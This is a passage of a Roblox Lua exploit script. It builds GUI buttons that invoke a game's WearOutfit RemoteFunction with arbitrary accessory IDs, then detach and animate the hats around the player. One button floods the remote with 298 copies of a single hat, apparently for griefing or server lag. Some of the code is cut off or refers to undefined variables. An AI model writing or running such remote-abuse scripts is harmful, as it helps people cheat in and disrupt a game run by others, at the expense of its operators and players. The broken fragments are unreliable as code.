local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 9.5
Zval.Value = -4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing24()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing24"
local HAT = "cealing24"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 9.5
Zval.Value = 8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function cealing25()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing25"
local HAT = "cealing25"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 9.5
Zval.Value = -8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

game:GetService("RunService").RenderStepped:Connect(function()
    
end)

habies:InvokeServer(args)
-- wall 1
wall1_1()
wall1_2()
wall1_3()
wall1_4()
wall1_5()
wall1_6()
wall1_7()
wall1_8()
wall1_9()
wall1_10()
wall1_11()
wall1_12()
wall1_13()
wall1_14()
--wall2
wall2_1()
wall2_2()
wall2_3()
wall2_4()
wall2_5()
wall2_6()
wall2_7()
wall2_8()
wall2_9()
wall2_10()
wall2_11()
wall2_12()
wall2_13()
wall2_14()
--wall3
wall3_1()
wall3_2()
wall3_3()
wall3_4()
wall3_5()
wall3_6()
wall3_7()
wall3_8()
wall3_9()
wall3_10()
wall3_11()
wall3_12()
wall3_13()
wall3_14()
wall3_15()
--final wall
wall4_2()
wall4_3()
wall4_4()
wall4_5()
wall4_7()
wall4_8()
wall4_9()
wall4_10()
wall4_11()
wall4_12()
wall4_13()
wall4_14()
wall4_15()
--cealing
cealing1()
cealing2()
cealing3()
cealing4()
cealing5()
cealing6()
cealing7()
cealing8()
cealing9()
cealing10()
cealing11()
cealing12()
cealing13()
cealing14()
cealing15()
cealing16()
cealing17()
cealing18()
cealing19()
cealing20()
cealing21()
cealing22()
cealing23()
cealing24()
cealing25()
    end
end)

Script_9.Name = "Script"
Script_9.Parent = HatScripts
Script_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_9.Position = UDim2.new(0, 0, 11, 0)
Script_9.Size = UDim2.new(0, 52, 0, 19)
Script_9.Visible = false
Script_9.TextScaled = true
Script_9.Font = Enum.Font.SourceSans
Script_9.Text = "Sword Playback Loudness"
Script_9.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_9.TextSize = 14.000
Script_9.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "158066212"
local args = {
    Face = "";
    
    Hat1 = "4315489767";
    Hat2 = "4794315940";
    Hat3 = "4506945409";
    Hat4 = "4458601937";
    Hat5 = "4524991457";
    Hat6 = "4820152700";
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)


-- Main Animation
-- Hat Position
local function hat1()
fe = game.Players.LocalPlayer.Character["MeshPartAccessory"]
fe.Name = "hat1"
local HAT = "hat1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 2
Yval.Value = 0
Zval.Value = 6

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 45

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				Yval.Value = so.PlaybackLoudness / 35
			end
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat2()
fe = game.Players.LocalPlayer.Character["MeshPartAccessory"]
fe.Name = "hat2"
local HAT = "hat2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -2
Yval.Value = 0
Zval.Value = 6

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 45

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				Yval.Value = so.PlaybackLoudness / 50
			end
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat3()
fe = game.Players.LocalPlayer.Character["MeshPartAccessory"]
fe.Name = "hat3"
local HAT = "hat3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 0
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 45

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				Yval.Value = so.PlaybackLoudness / 75
			end
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat4()
fe = game.Players.LocalPlayer.Character["MeshPartAccessory"]
fe.Name = "hat4"
local HAT = "hat4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 0
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 45

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				Yval.Value = so.PlaybackLoudness / 100
			end
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat5()
fe = game.Players.LocalPlayer.Character["ShadowBladeMasterAccessory"]
fe.Name = "hat5"
local HAT = "hat5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 6
Yval.Value = 0
Zval.Value = 2

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 48

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local k = math.random(50,125)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				Yval.Value = so.PlaybackLoudness / k
			end
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function hat6()
fe = game.Players.LocalPlayer.Character["BladeMasterAccessory"]
fe.Name = "hat6"
local HAT = "hat6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -6
Yval.Value = 0
Zval.Value = 2

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 48

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local k = math.random(50,125)
local function orie()
game['Run Service'].RenderStepped:Connect(function()
local plr = game.Players.LocalPlayer;
local chr = plr.Character;
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				Yval.Value = so.PlaybackLoudness / k
			end
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

hat1()
hat2()
hat3()
hat4()
hat5()
hat6()
end)

Script_10.Name = "Script"
Script_10.Parent = HatScripts
Script_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_10.Position = UDim2.new(-1.25, 0, 11, 0)
Script_10.Size = UDim2.new(0, 52, 0, 19)
Script_10.Visible = false
Script_10.Font = Enum.Font.SourceSans
Script_10.Text = "Sparkles!"
Script_10.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_10.TextSize = 14.000
Script_10.MouseButton1Click:connect(function()
   local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "226189871"
local args = {
    Face = "";
    
        Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;
    Hat7 = code;
    Hat8 = code;
    Hat9 = code;
    Hat10 = code;
    Hat11 = code;
    Hat12 = code;
    Hat13 = code;
    Hat14 = code;
    Hat15 = code;
    Hat16 = code;
    Hat17 = code;
    Hat18 = code;
    Hat19 = code;
    Hat20 = code;
    Hat21 = code;
    Hat22 = code;
    Hat23 = code;
    Hat24 = code;
    Hat25 = code;
    Hat26 = code;
    Hat27 = code;
    Hat28 = code;
    Hat29 = code;
    Hat30 = code;
    Hat31 = code;
    Hat32 = code;
    Hat33 = code;
    Hat34 = code;
    Hat35 = code;
    Hat36 = code;
    Hat37 = code;
    Hat38 = code;
    Hat39 = code;
    Hat40 = code;
    Hat41 = code;
    Hat42 = code;
    Hat43 = code;
    Hat44 = code;
    Hat45 = code;
    Hat46 = code;
    Hat47 = code;
    Hat48 = code;
    Hat49 = code;
    Hat50 = code;
        Hat51 = code;
    Hat52 = code;
    Hat53 = code;
    Hat54 = code;
    Hat55 = code;
    Hat56 = code;
    Hat57 = code;
    Hat58 = code;
    Hat59 = code;
    Hat60 = code;
    Hat61 = code;
    Hat62 = code;
    Hat63 = code;
    Hat64 = code;
    Hat65 = code;
    Hat66 = code;
    Hat67 = code;
    Hat68 = code;
    Hat69 = code;
    Hat70 = code;
    Hat71 = code;
    Hat72 = code;
    Hat73 = code;
    Hat74 = code;
    Hat75 = code;
    Hat76 = code;
    Hat77 = code;
    Hat78 = code;
    Hat79 = code;
    Hat80 = code;
    Hat81 = code;
    Hat82 = code;
    Hat83 = code;
    Hat84 = code;
    Hat85 = code;
    Hat86 = code;
    Hat87 = code;
    Hat88 = code;
    Hat89 = code;
    Hat90 = code;
    Hat91 = code;
    Hat92 = code;
    Hat93 = code;
    Hat94 = code;
    Hat95 = code;
    Hat96 = code;
    Hat97 = code;
    Hat98 = code;
    Hat99 = code;
    Hat100 = code;
    
    Hat101 = code;
    Hat102 = code;
    Hat103 = code;
    Hat104 = code;
    Hat105 = code;
    Hat106 = code;
    Hat107 = code;
    Hat108 = code;
    Hat109 = code;
    Hat110 = code;
    Hat111 = code;
    Hat112 = code;
    Hat113 = code;
    Hat114 = code;
    Hat115 = code;
    Hat116 = code;
    Hat117 = code;
    Hat118 = code;
    Hat119 = code;
    Hat120 = code;
    Hat121 = code;
    Hat122 = code;
    Hat123 = code;
    Hat124 = code;
    Hat125 = code;
    Hat126 = code;
    Hat127 = code;
    Hat128 = code;
    Hat129 = code;
    Hat130 = code;
    Hat131 = code;
    Hat132 = code;
    Hat133 = code;
    Hat134 = code;
    Hat135 = code;
    Hat136 = code;
    Hat137 = code;
    Hat138 = code;
    Hat139 = code;
    Hat140 = code;
    Hat141 = code;
    Hat142 = code;
    Hat143 = code;
    Hat144 = code;
    Hat145 = code;
    Hat146 = code;
    Hat147 = code;
    Hat148 = code;
    Hat149 = code;
    Hat150 = code;
    Hat151 = code;
    Hat152 = code;
    Hat153 = code;
    Hat154 = code;
    Hat155 = code;
    Hat156 = code;
    Hat157 = code;
    Hat158 = code;
    Hat159 = code;
    Hat160 = code;
    Hat161 = code;
    Hat162 = code;
    Hat163 = code;
    Hat164 = code;
    Hat165 = code;
    Hat166 = code;
    Hat167 = code;
    Hat168 = code;
    Hat169 = code;
    Hat170 = code;
    Hat171 = code;
    Hat172 = code;
    Hat173 = code;
    Hat174 = code;
    Hat175 = code;
    Hat176 = code;
    Hat177 = code;
    Hat178 = code;
    Hat179 = code;
    Hat180 = code;
    Hat181 = code;
    Hat182 = code;
    Hat183 = code;
    Hat184 = code;
    Hat185 = code;
    Hat186 = code;
    Hat187 = code;
    Hat188 = code;
    Hat189 = code;
    Hat190 = code;
    Hat191 = code;
    Hat192 = code;
    Hat193 = code;
    Hat194 = code;
    Hat195 = code;
    Hat196 = code;
    Hat197 = code;
    Hat198 = code;
    Hat199 = code;
    Hat200 = code;
    Hat201 = code;
    Hat202 = code;
    Hat203 = code;
    Hat204 = code;
    Hat205 = code;
    Hat206 = code;
    Hat207 = code;
    Hat208 = code;
    Hat209 = code;
    Hat210 = code;
    Hat211 = code;
    Hat212 = code;
    Hat213 = code;
    Hat214 = code;
    Hat215 = code;
    Hat216 = code;
    Hat217 = code;
    Hat218 = code;
    Hat219 = code;
    Hat220 = code;
    Hat221 = code;
    Hat222 = code;
    Hat223 = code;
    Hat224 = code;
    Hat225 = code;
    Hat226 = code;
    Hat227 = code;
    Hat228 = code;
    Hat229 = code;
    Hat230 = code;
    Hat231 = code;
    Hat232 = code;
    Hat233 = code;
    Hat234 = code;
    Hat235 = code;
    Hat236 = code;
    Hat237 = code;
    Hat238 = code;
    Hat239 = code;
    Hat240 = code;
    Hat241 = code;
    Hat242 = code;
    Hat243 = code;
    Hat244 = code;
    Hat245 = code;
    Hat246 = code;
    Hat247 = code;
    Hat248 = code;
    Hat249 = code;
    Hat250 = code;
    Hat251 = code;
    Hat252 = code;
    Hat253 = code;
    Hat254 = code;
    Hat255 = code;
    Hat256 = code;
    Hat257 = code;
    Hat258 = code;
    Hat259 = code;
    Hat260 = code;
    Hat261 = code;
    Hat262 = code;
    Hat263 = code;
    Hat264 = code;
    Hat265 = code;
    Hat266 = code;
    Hat267 = code;
    Hat268 = code;
    Hat269 = code;
    Hat270 = code;
    Hat271 = code;
    Hat272 = code;
    Hat273 = code;
    Hat274 = code;
    Hat275 = code;
    Hat276 = code;
    Hat277 = code;
    Hat278 = code;
    Hat279 = code;
    Hat280 = code;
    Hat281 = code;
    Hat282 = code;
    Hat283 = code;
    Hat284 = code;
    Hat285 = code;
    Hat286 = code;
    Hat287 = code;
    Hat288 = code;
    Hat289 = code;
    Hat290 = code;
    Hat291 = code;
    Hat292 = code;
    Hat293 = code;
    Hat294 = code;
    Hat295 = code;
    Hat296 = code;
    Hat297 = code;
    Hat298 = code;
